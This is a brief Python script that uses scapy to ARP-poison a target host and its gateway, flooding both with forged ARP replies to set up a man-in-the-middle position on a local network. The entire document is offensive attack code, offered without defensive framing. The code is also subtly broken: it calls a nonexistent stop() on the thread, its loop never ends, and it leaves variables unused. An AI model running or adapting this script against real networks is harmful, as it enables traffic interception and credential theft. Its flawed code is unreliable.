#!/usr/bin/env python3
from scapy.all import *
import time

def run_arp_poison(interface, target=None, duration=60, count=1000):
    if not target:
        target = "192.168.1.100"  # Default target IP
    attacker_ip = "192.168.1.50"  # Attacker IP
    gateway_ip = "192.168.1.1"    # Gateway
    print(f"[+] ARP poisoning {target} on {interface} for {duration}s")
    def poison():
        while True:
            send(ARP(op=2, pdst=target, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), iface=interface, verbose=0)
            send(ARP(op=2, pdst=gateway_ip, psrc=target, hwdst="ff:ff:ff:ff:ff:ff"), iface=interface, verbose=0)
            time.sleep(2)
    poison_thread = threading.Thread(target=poison)
    poison_thread.start()
    time.sleep(duration)
    poison_thread.stop()  # Simplified; use daemon in prod
    print("[+] ARP poisoning stopped.")
